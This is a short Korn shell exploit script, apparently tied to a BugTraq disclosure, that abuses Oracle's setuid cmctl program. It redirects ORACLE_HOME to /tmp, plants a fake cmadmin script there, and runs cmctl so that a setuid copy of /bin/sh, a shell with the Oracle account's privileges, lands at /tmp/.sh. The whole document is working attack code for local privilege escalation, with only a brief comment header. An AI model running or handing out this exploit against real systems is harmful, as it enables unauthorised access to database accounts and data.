#! /usr/bin/ksh
#############################################
#
# cmctl is installed setuid to Oracle
# by default. See BugTraq ID 170 and Oracle
# bug id 701297 and 714293. 
#
# This script will create a setuid Oracle shell,
# /tmp/.sh
#

# redirect environment variables
export ORACLE_HOME=/tmp
export ORAHOME=/tmp

mkdir /tmp/bin
chmod a+rx /tmp/bin

# create cmadmin script
cat <<EOF > /tmp/bin/cmadmin
cp /bin/sh /tmp/.sh
chmod u+s /tmp/.sh
chmod a+rx /tmp/.sh
EOF

chmod a+rx /tmp/bin/cmadmin

# run cmctl to crete Oracle setuid shell
/oracle/products/V815/bin/cmctl start cmadmin
